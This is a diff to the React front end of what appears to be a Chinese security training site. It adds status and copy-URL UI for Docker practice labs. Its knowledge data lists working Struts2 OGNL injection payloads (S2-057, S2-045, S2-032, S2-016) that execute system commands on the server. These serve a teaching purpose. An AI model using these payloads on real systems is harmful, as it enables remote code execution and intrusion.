@@ -21,7 +21,9 @@ import {
   faPuzzlePiece,
   faLayerGroup,
   faGlobe,
-  faHdd
+  faHdd,
+  faExternalLinkAlt,
+  faCopy
 } from '@fortawesome/free-solid-svg-icons';
 import TerminalFeature from '../components/TerminalPanel';
 import { startTargetEnvironment } from '../services/targetService';
@@ -926,7 +928,7 @@ const knowledgeData = {
         title: 'Struts2多种典型漏洞利用',
         content: 'Apache Struts2是一个流行的Java Web应用框架，其众多版本中发现的安全漏洞对企业应用构成了严重威胁。Struts2最著名的漏洞涉及OGNL表达式注入，允许远程代码执行。',
         examples: [
-          "S2-057(CVE-2018-11776): 命名空间值与OGNL表达式注入\n/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%29%28%23cmd%3D%22id%22%29%28%23iswin%3D%28%40java.lang.System%40getProperty%28%22os.name%22%29.toLowerCase%28%29.contains%28%22win%22%29%29%29%28%23cmds%3D%28%23iswin%3F%7B%22cmd.exe%22%2C%22%2Fc%22%2C%23cmd%7D%3A%7B%22%2Fbin%2Fbash%22%2C%22-c%22%2C%23cmd%7D%29%29%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29%28%23p.redirectErrorStream%28true%29%29%28%40org.apache.commons.io.IOUtils%40toString%28%23p.start%28%29.getInputStream%28%29%29%29%7D/actionChain1.action",
+          "S2-057(CVE-2018-11776): 命名空间值与OGNL表达式注入\n/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%29%28%23cmd%3D%22id%22%29%28%23iswin%3D%28%40java.lang.System%40getProperty%28%22os.name%22%29.toLowerCase%28%29.contains%28%22win%22%29%29%28%23cmds%3D%28%23iswin%3F%7B%22cmd.exe%22%2C%22%2Fc%22%2C%23cmd%7D%3A%7B%22%2Fbin%2Fbash%22%2C%22-c%22%2C%23cmd%7D%29%29%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29%28%23p.redirectErrorStream%28true%29%29%28%40org.apache.commons.io.IOUtils%40toString%28%23p.start%28%29.getInputStream%28%29%29%29%7D/actionChain1.action",
           "S2-045(CVE-2017-5638): Content-Type头OGNL注入\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
           "S2-032(CVE-2016-3081): 方法调用时的OGNL注入\n/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=&encoding=UTF-8&cmd=id",
           "S2-016(CVE-2013-2251): 参数值OGNL注入\nredirect:\\${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
@@ -1190,13 +1192,30 @@ function KnowledgeDetail() {
   const [loading, setLoading] = useState(false);
   const [category, setCategory] = useState(null);
   const [activeSection, setActiveSection] = useState(null);
-  const [targetEnvStatus, setTargetEnvStatus] = useState({ loading: false, error: null, url: null });
+  const [targetEnvStatus, setTargetEnvStatus] = useState({ loading: false, error: null, url: null, status: '正在准备启动靶场环境...' });
+  const [copyStatus, setCopyStatus] = useState('');
+
+  // 处理复制地址
+  const handleCopyUrl = () => {
+    if (targetEnvStatus.url) {
+      navigator.clipboard.writeText(targetEnvStatus.url)
+        .then(() => {
+          setCopyStatus('已复制');
+          setTimeout(() => setCopyStatus(''), 2000);
+        })
+        .catch(err => {
+          console.error('复制失败:', err);
+          setCopyStatus('复制失败');
+          setTimeout(() => setCopyStatus(''), 2000);
+        });
+    }
+  };
 
   // 处理实验按钮点击
   const handleExperimentClick = async (section) => {
     setActiveSection(section);
     // 设置状态为加载中
-    setTargetEnvStatus({ loading: true, error: null, url: null });
+    setTargetEnvStatus({ loading: true, error: null, url: null, status: '正在准备启动靶场环境...' });
     
     try {
       // 启动对应的靶场环境
@@ -1211,8 +1230,11 @@ function KnowledgeDetail() {
           loading: false, 
           error: null, 
           url: result.url,
+          localUrl: result.localUrl,
+          ipAddress: result.ipAddress,
           containerName: result.containerName,
-          port: result.port 
+          port: result.port,
+          status: '靶场环境已成功启动'
         });
         
         // 可以选择自动在新窗口打开环境
@@ -1378,10 +1400,65 @@ function KnowledgeDetail() {
                 </div>
               )}
               
-              {targetEnvStatus.url && activeSection?.title === section.title && !targetEnvStatus.error && (
-                <div className="mt-2 text-green-400 text-sm">
-                  <FontAwesomeIcon icon={faCheckCircle} className="mr-1" />
-                  环境已启动: <a href={targetEnvStatus.url} target="_blank" rel="noopener noreferrer" className="underline">{targetEnvStatus.url}</a>
+              {targetEnvStatus.loading && activeSection?.title === section.title && (
+                <div className="mt-2 p-3 bg-[#1E1E1E] rounded-lg text-blue-400 text-sm">
+                  <div className="flex items-center">
+                    <div className="animate-spin mr-2 h-4 w-4 border-2 border-blue-400 border-t-transparent rounded-full"></div>
+                    <span className="font-medium">{targetEnvStatus.status || '正在启动环境...'}</span>
+                  </div>
+                  <div className="mt-2 text-gray-400 text-xs">
+                    <p>请稍等，靶场环境正在启动中。这可能需要一点时间：</p>
+                    <ul className="ml-4 mt-1 list-disc space-y-1">
+                      <li>检查Docker服务</li>
+                      <li>下载或准备镜像</li>
+                      <li>分配可用网络端口</li>
+                      <li>启动容器并配置网络</li>
+                    </ul>
+                  </div>
+                </div>
+              )}
+              
+              {!targetEnvStatus.loading && !targetEnvStatus.error && targetEnvStatus.url && activeSection?.title === section.title && (
+                <div className="mt-2 p-3 bg-[#1E1E1E] rounded-lg">
+                  <div className="flex items-center text-green-400 text-sm mb-2">
+                    <FontAwesomeIcon icon={faCheckCircle} className="mr-1" />
+                    {targetEnvStatus.status || '靶场环境已成功启动'}
+                  </div>
+                  
+                  <div className="space-y-1">
+                    <div className="text-sm flex">
+                      <span className="text-gray-400 w-20">访问地址:</span>
+                      <a href={targetEnvStatus.url} target="_blank" rel="noopener noreferrer" className="text-primary hover:underline truncate">
+                        {targetEnvStatus.url}
+                      </a>
+                    </div>
+                    <div className="text-sm flex">
+                      <span className="text-gray-400 w-20">本地地址:</span>
+                      <a href={targetEnvStatus.localUrl} target="_blank" rel="noopener noreferrer" className="text-primary hover:underline truncate">
+                        {targetEnvStatus.localUrl}
+                      </a>
+                    </div>
+                    <div className="text-sm flex">
+                      <span className="text-gray-400 w-20">端口:</span>
+                      <span className="text-white">{targetEnvStatus.port}</span>
+                    </div>
+                    <div className="text-sm flex">
+                      <span className="text-gray-400 w-20">容器名称:</span>
+                      <span className="text-white truncate">{targetEnvStatus.containerName}</span>
+                    </div>
+                  </div>
+                  
+                  <div className="mt-2 flex">
+                    <a href={targetEnvStatus.url} target="_blank" rel="noopener noreferrer" className="bg-primary hover:bg-primary/90 text-white px-3 py-1 rounded text-xs flex items-center mr-2">
+                      <FontAwesomeIcon icon={faExternalLinkAlt} className="mr-1" />
+                      打开环境
+                    </a>
+                    <button className="bg-gray-700 hover:bg-gray-600 text-white px-3 py-1 rounded text-xs flex items-center" onClick={handleCopyUrl}>
+                      <FontAwesomeIcon icon={faCopy} className="mr-1" />
+                      复制地址
+                      {copyStatus && <span className="ml-1">{copyStatus}</span>}
+                    </button>
+                  </div>
                 </div>
               )}
             </div>
